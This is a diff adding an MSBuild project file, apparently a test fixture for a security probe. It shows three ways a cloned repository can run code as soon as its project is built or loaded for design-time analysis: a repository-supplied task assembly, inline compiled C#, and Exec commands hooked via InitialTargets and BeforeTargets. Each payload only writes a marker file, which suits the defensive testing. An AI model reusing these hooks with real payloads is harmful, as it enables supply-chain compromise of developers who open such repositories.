@@ -1,0 +1,61 @@
+<Project Sdk="Microsoft.NET.Sdk" InitialTargets="PwnInitial">
+
+  <!--
+    THE HOSTILE PROJECT. Everything below is what an attacker can put in a .csproj that you get
+    simply by CLONING their repository. Nothing here requires the victim to build anything first.
+
+    Three independent vectors, each leaving a DIFFERENT marker file, so the probe can tell which
+    one fired rather than reporting a single undifferentiated "something ran".
+  -->
+
+  <PropertyGroup>
+    <TargetFramework>net10.0</TargetFramework>
+    <Nullable>enable</Nullable>
+    <TreatWarningsAsErrors>false</TreatWarningsAsErrors>
+    <MarkerDir>$(MSBuildThisFileDirectory)..\markers\</MarkerDir>
+  </PropertyGroup>
+
+  <!-- VECTOR 1: a repository-authored task assembly, declared with UsingTask. -->
+  <UsingTask TaskName="HostileTask.MarkerTask"
+             AssemblyFile="$(MSBuildThisFileDirectory)..\HostileTask\bin\Release\netstandard2.0\HostileTask.dll"
+             Condition="Exists('$(MSBuildThisFileDirectory)..\HostileTask\bin\Release\netstandard2.0\HostileTask.dll')" />
+
+  <!-- VECTOR 3: an inline task. Needs NO prebuilt assembly - MSBuild compiles and runs this C#. -->
+  <UsingTask TaskName="InlinePwn" TaskFactory="RoslynCodeTaskFactory"
+             AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+    <ParameterGroup>
+      <MarkerPath ParameterType="System.String" Required="true" />
+    </ParameterGroup>
+    <Task>
+      <Code Type="Fragment" Language="cs"><![CDATA[
+        System.IO.Directory.CreateDirectory(System.IO.Path.GetDirectoryName(MarkerPath));
+        System.IO.File.WriteAllText(MarkerPath, "executed by RoslynCodeTaskFactory inline C#\n");
+      ]]></Code>
+    </Task>
+  </UsingTask>
+
+  <!--
+    InitialTargets runs before anything else this project does. If MSBuild builds this project at
+    all - including a design-time build - these fire.
+  -->
+  <Target Name="PwnInitial">
+    <!-- VECTOR 2: the built-in Exec task. Arbitrary command, no custom assembly needed. -->
+    <MakeDir Directories="$(MarkerDir)" />
+    <Exec Command="cmd /c echo executed by the built-in Exec task &gt; &quot;$(MarkerDir)marker-exec.txt&quot;"
+          ContinueOnError="true" />
+    <InlinePwn MarkerPath="$(MarkerDir)marker-inline.txt" ContinueOnError="true" />
+    <HostileTask.MarkerTask MarkerPath="$(MarkerDir)marker-usingtask.txt" ContinueOnError="true"
+                            Condition="Exists('$(MSBuildThisFileDirectory)..\HostileTask\bin\Release\netstandard2.0\HostileTask.dll')" />
+  </Target>
+
+  <!--
+    Belt and braces: hook the targets a DESIGN-TIME build actually runs, in case InitialTargets is
+    somehow bypassed. These are the ones MSBuildWorkspace drives to get references and sources.
+  -->
+  <Target Name="PwnDesignTime" BeforeTargets="CoreCompile;ResolveAssemblyReferences;GetTargetFrameworks;Compile">
+    <MakeDir Directories="$(MarkerDir)" />
+    <Exec Command="cmd /c echo executed from a design-time target &gt; &quot;$(MarkerDir)marker-designtime.txt&quot;"
+          ContinueOnError="true" />
+  </Target>
+
+</Project>
